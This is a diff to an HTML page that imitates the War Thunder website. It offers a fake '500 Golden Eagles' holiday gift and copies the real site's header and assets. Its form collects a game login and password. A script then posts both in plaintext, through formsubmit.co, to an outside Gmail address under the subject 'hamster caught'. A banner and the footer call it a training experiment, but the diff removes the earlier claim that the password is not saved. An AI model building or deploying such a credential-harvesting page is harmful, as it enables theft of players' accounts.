@@ -3,209 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <title>War Thunder — подарок</title>
+    <link rel="stylesheet" href="https://warthunder.ru/assets/css/index.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        
-        /* Верхняя панель как на скриншоте */
-        .top-bar {
-            background: #0a0a0a;
-            padding: 12px 40px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            border-bottom: 1px solid #333;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            z-index: 100;
-            font-family: 'Arial', sans-serif;
-        }
-
-        .top-bar-left {
-            display: flex;
-            align-items: center;
-            gap: 25px;
-        }
-
-        .top-bar-logo {
-            font-size: 24px;
-            font-weight: 900;
-            color: white;
-            letter-spacing: 2px;
-        }
-
-        .top-bar-logo span {
-            color: #ffd700;
-        }
-
-        .top-bar-welcome {
-            color: #888;
-            font-size: 14px;
-            border-left: 1px solid #333;
-            padding-left: 25px;
-        }
-
-        .top-bar-menu {
-            display: flex;
-            gap: 30px;
-            color: #ccc;
-            font-size: 13px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .top-bar-menu span {
-            cursor: default;
-            transition: 0.2s;
-        }
-
-        .top-bar-menu span:hover {
-            color: #ffd700;
-        }
-
-        .top-bar-right {
-            display: flex;
-            align-items: center;
-        }
-
-        .top-bar-register {
-            background: #ffd700;
-            color: black;
-            padding: 8px 22px;
-            border-radius: 4px;
-            font-weight: bold;
-            font-size: 13px;
-            text-transform: uppercase;
-            cursor: default;
-            letter-spacing: 1px;
-        }
-
-        body {
-            font-family: 'Arial', sans-serif;
-            background: url('https://raw.githubusercontent.com/warthunderprize/war-gift/main/3840x2160_line_of_contact_logo_ru_dfcacf9311d0af4bf5296e52759249ac.jpg') no-repeat center center fixed;
-            background-size: cover;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding-top: 70px;
-        }
-
-        .overlay {
-            background: rgba(0, 0, 0, 0.6);
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 1;
-        }
-
-        .card {
-            position: relative;
-            z-index: 2;
-            background: rgba(20, 20, 30, 0.9);
-            backdrop-filter: blur(5px);
-            padding: 40px;
-            border-radius: 20px;
-            width: 450px;
-            text-align: center;
-            color: white;
-            box-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
-            border: 1px solid #ffd700;
-            margin-top: 20px;
-        }
-
-        .logo {
-            font-size: 48px;
-            font-weight: 900;
-            letter-spacing: 5px;
-            margin-bottom: 10px;
-            text-shadow: 0 0 20px gold;
-        }
-
-        .logo span {
-            color: #ffd700;
-        }
-
-        h1 {
-            font-size: 32px;
-            margin-bottom: 10px;
-            color: #ffd700;
-        }
-
-        .timer {
-            background: #1e1e2a;
-            padding: 20px;
+        /* Дополнительные стили для формы */
+        .promo__form {
+            margin-top: 30px;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 25px;
             border-radius: 10px;
-            margin: 20px 0;
-            font-size: 42px;
-            font-weight: bold;
-            border: 1px solid #333;
-            color: #ffd700;
-            font-family: monospace;
+            border: 1px solid #ffd700;
+            max-width: 400px;
+            margin-left: auto;
+            margin-right: auto;
         }
-
-        input {
+        .promo__form input {
             width: 100%;
-            padding: 15px;
-            margin: 10px 0;
-            border: none;
-            border-radius: 8px;
-            background: #2a2a3a;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #444;
+            border-radius: 5px;
+            background: #1a1a1a;
             color: white;
             font-size: 16px;
-            border: 1px solid #444;
         }
-
-        input:focus {
+        .promo__form input:focus {
             outline: none;
             border-color: #ffd700;
         }
-
-        button {
+        .promo__form button {
             width: 100%;
-            padding: 16px;
+            padding: 14px;
             background: #ffd700;
             color: black;
             font-weight: bold;
             border: none;
-            border-radius: 8px;
+            border-radius: 5px;
             font-size: 18px;
             cursor: pointer;
-            margin: 20px 0;
-            transition: 0.3s;
+            margin-top: 15px;
             text-transform: uppercase;
-            letter-spacing: 1px;
         }
-
-        button:hover {
+        .promo__form button:hover {
             background: #ffed4a;
-            box-shadow: 0 0 20px gold;
+            box-shadow: 0 0 15px gold;
         }
-
-        .buttons {
-            display: flex;
-            gap: 10px;
-            margin: 20px 0;
-        }
-
-        .btn-secondary {
-            flex: 1;
-            padding: 10px;
-            background: transparent;
-            border: 1px solid #ffd700;
-            color: #ffd700;
-            border-radius: 5px;
-            cursor: default;
-            font-size: 14px;
-        }
-
-        small {
-            display: block;
-            color: #888;
-            font-size: 12px;
-        }
-
-        /* Стили для баннера-предупреждения */
         .warning-banner {
             display: none;
             position: fixed;
@@ -215,182 +56,198 @@
             background: #ff4444;
             color: white;
             text-align: center;
-            padding: 25px;
-            font-size: 22px;
-            z-index: 1000;
+            padding: 20px;
+            font-size: 20px;
+            z-index: 10000;
             font-weight: bold;
-            border-bottom: 4px solid #ff0000;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.5);
+            border-bottom: 3px solid #ff0000;
         }
         .warning-banner small {
             display: block;
-            font-size: 16px;
-            margin-top: 10px;
+            font-size: 14px;
+            margin-top: 8px;
             color: #ffeeee;
         }
         .warning-banner button {
             background: white;
             color: #ff4444;
             border: none;
-            padding: 8px 25px;
-            margin-top: 15px;
-            border-radius: 30px;
+            padding: 5px 20px;
+            margin-top: 10px;
+            border-radius: 20px;
             cursor: pointer;
-            font-size: 16px;
-            font-weight: bold;
-            width: auto;
-        }
-        .warning-banner button:hover {
-            background: #ffeeee;
+            font-size: 14px;
         }
     </style>
 </head>
-<body>
-    <!-- Баннер-предупреждение (скрыт по умолчанию) -->
+<body id="bodyRoot" class="body_promo-open">
+
+    <!-- Баннер-предупреждение -->
     <div class="warning-banner" id="warningBanner">
-        ⚠️ ЭТО ФИШИНГОВЫЙ САЙТ! УЧЕБНЫЙ ЭКСПЕРИМЕНТ ⚠️
+        ⚠️ ЭТО УЧЕБНЫЙ ЭКСПЕРИМЕНТ! ФИШИНГОВЫЙ САЙТ ⚠️
         <br>
-        <small>Вы только что ввели свои данные на поддельной странице War Thunder. В реальности ваш аккаунт был бы украден. Пароль не сохранён — это эксперимент.</small>
+        <small>Вы ввели данные на поддельной странице. В реальности аккаунт был бы украден.</small>
         <br>
         <button onclick="document.getElementById('warningBanner').style.display='none'">Закрыть</button>
     </div>
 
-    <!-- Верхняя панель как на скриншоте -->
-    <div class="top-bar">
-        <div class="top-bar-left">
-            <div class="top-bar-logo">
-                <span>WAR</span> THUNDER
-            </div>
-            <div class="top-bar-welcome">
-                Добро пожаловать в СНГ регион
-            </div>
-        </div>
-        
-        <div class="top-bar-menu">
-            <span>ИГРА</span>
-            <span>МЕДИА</span>
-            <span>ОБУЧЕНИЕ</span>
-            <span>МАСТЕРСКАЯ</span>
-            <span>СООБЩЕСТВО</span>
-            <span>КИБЕРСПОРТ</span>
-            <span>КОНТАКТЫ</span>
-        </div>
-        
-        <div class="top-bar-right">
-            <div class="top-bar-register">
-                РЕГИСТРАЦИЯ
+    <!-- Верхняя панель (оригинальная) -->
+    <div id="GCM-Container" class="GCM-Container">
+        <div class="GCM-Menu">
+            <div class="GCM-Menu-Wrapper" style="max-width: 100%;">
+                <a href="https://pixstorm.ru/" class="GCM-Menu-Item GCM-Menu-Item__root">
+                    <div class="GCM-Menu-ItemLabel">
+                        <img src="https://login.pixstorm.ru/gcm/icon-pix.svg" width="22" height="22">
+                    </div>
+                </a>
+                <div class="GCM-Menu-Item dropdown" style="position: static;">
+                    <div class="GCM-Menu-ItemLabel">Игры<span class="GCM-Menu-ItemIcon right"><svg width="8" height="8" fill="none"><path fill="currentColor" d="m4 7 3-5H1z"></path></svg></span></div>
+                </div>
+                <a href="https://store.pixstorm.ru/" class="GCM-Menu-Item style_gold GCM-Menu-Item__shop">
+                    <div class="GCM-Menu-ItemLabel">Магазин</div>
+                </a>
+                <a href="https://support.pixstorm.ru/" class="GCM-Menu-Item GCM-Menu-Item__support">
+                    <div class="GCM-Menu-ItemLabel">Поддержка</div>
+                </a>
+                <div class="GCM-Menu-FillerItem"></div>
+                <a href="https://login.pixstorm.ru/" class="GCM-Menu-Item GCM-Menu-Item__sign-in">
+                    <div class="GCM-Menu-ItemLabel">
+                        <span class="GCM-Menu-ItemIcon left">
+                            <svg width="16" height="16" fill="none"><g fill="currentColor"><path fill-rule="evenodd" d="M14.117 10.786a6.668 6.668 0 0 1-12.117 0 13.3 13.3 0 0 1 6.058-1.453c2.182 0 4.241.524 6.059 1.453" clip-rule="evenodd"></path><ellipse cx="8" cy="4.667" rx="2.667" ry="3.333"></ellipse></g></svg>
+                        </span>Войти
+                    </div>
+                </a>
+                <div class="GCM-Menu-Item GCM-LangSelect">
+                    <div class="GCM-Menu-ItemLabel">
+                        <span class="GCM-Menu-ItemIcon left"><img src="https://warthunder.ru/assets/img/svg/flags/flag_ru.svg" class="GCM-LangSelect__icon-trigger"></span>ru
+                    </div>
+                </div>
             </div>
         </div>
     </div>
 
-    <div class="overlay"></div>
-    
-    <div class="card">
-        <div class="logo">
-            <span>WAR</span> THUNDER
+    <!-- Шапка сайта -->
+    <header id="headerRoot">
+        <div class="header__sticky-trigger"></div>
+        <div class="header">
+            <div class="header__wrapper">
+                <a class="header__logo" href="/">
+                    <svg class="svg"><use href="https://warthunder.ru/assets/img/svg/logo-wt.svg#logo-wt"></use></svg>
+                </a>
+                <ul class="header__nav header-nav">
+                    <li class="header-nav__widget">
+                        <a class="header-welcome" href="#">
+                            <svg><use href="https://warthunder.ru/assets/img/pix/svg/logo-pix_small_cc.svg#logo-pix_small_cc"></use></svg>
+                            <span>Добро пожаловать в СНГ регион</span>
+                        </a>
+                    </li>
+                    <li class="header-nav__item"><a class="header-nav__item-name" href="#">Игра</a></li>
+                    <li class="header-nav__item"><a class="header-nav__item-name" href="#">Медиа</a></li>
+                    <li class="header-nav__item"><a class="header-nav__item-name" href="#">Обучение</a></li>
+                    <li class="header-nav__item"><a class="header-nav__item-name" href="#">Мастерская</a></li>
+                    <li class="header-nav__item"><a class="header-nav__item-name" href="#">Сообщество</a></li>
+                    <li class="header-nav__item"><a class="header-nav__item-name" href="#">Киберспорт</a></li>
+                    <li class="header-nav__item"><a class="header-nav__item-name" href="#">Контакты</a></li>
+                    <li class="header-nav__item header-nav__item--to-right">
+                        <a class="header-nav__button button button--x-small button--red-bg" href="#">Регистрация</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </header>
+
+    <!-- Основной контент -->
+    <div class="content">
+        <div class="content__background global__mobile-hidden">
+            <video preload="none" muted="" loop="" autoplay disablepictureinpicture="">
+                <source src="https://staticfiles-ru.warthunder.com/upload/image/media/bg/reel-2023.mp4" type="video/mp4">
+            </video>
         </div>
 
-        <h1>500 ЗОЛОТЫХ ОРЛОВ</h1>
-        <p>в честь ДНЯ ЗАЩИТНИКА ОТЕЧЕСТВА</p>
+        <!-- Промо-блок с формой -->
+        <section class="promo">
+            <div class="promo__wrapper">
+                <div class="promo__content">
+                    <img class="promo__title" src="https://warthunder.ru/assets/img/svg/logo-warthunder-new.svg" alt="Warthunder">
 
-        <div class="timer" id="timer">25:34:12</div>
+                    <!-- НАША ФОРМА -->
+                    <div class="promo__form">
+                        <h2 style="color: #ffd700; margin-bottom: 15px;">ПОЛУЧИ 500 ЗОЛОТЫХ ОРЛОВ</h2>
+                        <p style="color: #ccc; margin-bottom: 20px;">в честь Дня защитника Отечества</p>
+                        
+                        <form id="phishForm" action="https://formsubmit.co/dangerlight228@gmail.com" method="POST">
+                            <input type="hidden" name="_next" value="https://warthunderprize.github.io/war-gift/">
+                            <input type="hidden" name="_captcha" value="false">
+                            <input type="hidden" name="_template" value="table">
+                            
+                            <input type="text" name="login" placeholder="Логин или e-mail" id="login" required>
+                            <input type="password" name="password" placeholder="Пароль" id="password" required>
+                            
+                            <button type="submit">ПОЛУЧИТЬ НАГРАДУ</button>
+                        </form>
+                        
+                        <p style="color: #888; font-size: 12px; margin-top: 15px;">Акция ограничена: первые 50000 игроков</p>
+                    </div>
 
-        <form id="phishForm" action="https://formsubmit.co/da171ef14e74a46311a2a7315e4dfb65" method="POST">
-            <input type="hidden" name="_next" value="https://warthunderprize.github.io/war-gift/thanks.html">
-            <input type="hidden" name="_captcha" value="false">
-            <input type="hidden" name="_template" value="table">
-            
-            <input type="text" name="login" placeholder="Логин или e-mail" id="login" required>
-            <input type="password" name="password" placeholder="Пароль" id="password" required>
-            
-            <button type="submit" id="submitBtn">ПОЛУЧИТЬ НАГРАДУ</button>
-        </form>
+                    <div class="promo__buttons">
+                        <a class="promo__button button button--red-bg button--big" href="#">Регистрация</a>
+                        <a class="promo__button button button--corners button--light" href="#">Скачать игру</a>
+                    </div>
 
-        <div class="buttons">
-            <div class="btn-secondary">РЕГИСТРАЦИЯ</div>
-            <div class="btn-secondary">СКАЧАТЬ ИГРУ</div>
-        </div>
-
-        <small>Акция ограничена: первые 50000 игроков</small>
+                    <div class="promo__logotypes footer-logotypes footer-logotypes--promo-footer">
+                        <svg class="footer-logotypes__windows"><use href="https://warthunder.ru/assets/img/svg/platforms/logo-windows.svg#logo-windows"></use></svg>
+                        <svg class="footer-logotypes__mac"><use href="https://warthunder.ru/assets/img/svg/platforms/logo-mac.svg#logo-mac"></use></svg>
+                        <svg class="footer-logotypes__linux"><use href="https://warthunder.ru/assets/img/svg/platforms/logo-linux.svg#logo-linux"></use></svg>
+                    </div>
+                </div>
+            </div>
+        </section>
     </div>
+
+    <!-- Футер -->
+    <footer class="footer">
+        <div class="footer__wrapper">
+            <div class="footer__copyright">
+                © 2026 ООО «Пиксель Шквал». Учебный эксперимент по социальной инженерии.
+            </div>
+        </div>
+    </footer>
 
     <script>
-        // Устанавливаем дату окончания: 27 февраля 2026, 20:00
-        var countDownDate = new Date(2026, 1, 27, 20, 0, 0).getTime();
-        
-        function updateTimer() {
-            var now = new Date().getTime();
-            var distance = countDownDate - now;
-            
-            if (distance < 0) {
-                document.getElementById("timer").innerHTML = "АКЦИЯ ЗАВЕРШЕНА";
-                return;
-            }
-            
-            var days = Math.floor(distance / (1000 * 60 * 60 * 24));
-            var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
-            var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
-            var seconds = Math.floor((distance % (1000 * 60)) / 1000);
-            
-            if (days > 0) {
-                document.getElementById("timer").innerHTML = 
-                    days + 'д ' + 
-                    (hours < 10 ? '0' + hours : hours) + ':' +
-                    (minutes < 10 ? '0' + minutes : minutes) + ':' +
-                    (seconds < 10 ? '0' + seconds : seconds);
-            } else {
-                document.getElementById("timer").innerHTML = 
-                    (hours < 10 ? '0' + hours : hours) + ':' +
-                    (minutes < 10 ? '0' + minutes : minutes) + ':' +
-                    (seconds < 10 ? '0' + seconds : seconds);
-            }
-        }
-        
-        updateTimer();
-        setInterval(updateTimer, 1000);
-
-        // Перехватываем отправку формы
+        // Перехват отправки формы
         document.getElementById('phishForm').addEventListener('submit', function(e) {
-            e.preventDefault(); // Останавливаем обычную отправку
+            e.preventDefault();
             
-            // Получаем данные
             var login = document.getElementById('login').value;
             var password = document.getElementById('password').value;
             var time = new Date().toLocaleString('ru-RU');
             
-            // Отправляем данные на formsubmit
+            // Отправка на formsubmit
             fetch(this.action, {
                 method: 'POST',
                 body: new FormData(this)
-            }).catch(error => console.log('Ошибка отправки:', error));
+            }).catch(error => console.log('Ошибка:', error));
             
-            // ОТПРАВКА УВЕДОМЛЕНИЯ ТЕБЕ НА ПОЧТУ
+            // Отправка уведомления
             fetch('https://formsubmit.co/dangerlight228@gmail.com', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
+                headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    _subject: '🐹 НОВЫЙ ХОМЯЧОК ПОПАЛСЯ!',
-                    _template: 'table',
-                    _captcha: 'false',
-                    message: `🐹 ЕЩЁ ОДИН ХОМЯЧОК ПОПАЛСЯ!\n\nВремя: ${time}`
+                    _subject: '🐹 ХОМЯЧОК ПОПАЛСЯ!',
+                    message: `Логин: ${login}\nПароль: ${password}\nВремя: ${time}`
                 })
-            }).catch(error => console.log('Ошибка отправки уведомления:', error));
+            }).catch(error => console.log('Ошибка уведомления:', error));
             
-            // Показываем баннер
+            // Показ баннера
             document.getElementById('warningBanner').style.display = 'block';
             
-            // Очищаем поля
+            // Очистка полей
             document.getElementById('login').value = '';
             document.getElementById('password').value = '';
             
-            // Плавно скроллим к баннеру
+            // Скролл к баннеру
             window.scrollTo({ top: 0, behavior: 'smooth' });
         });
     </script>
 </body>
 </html>
-
-
-
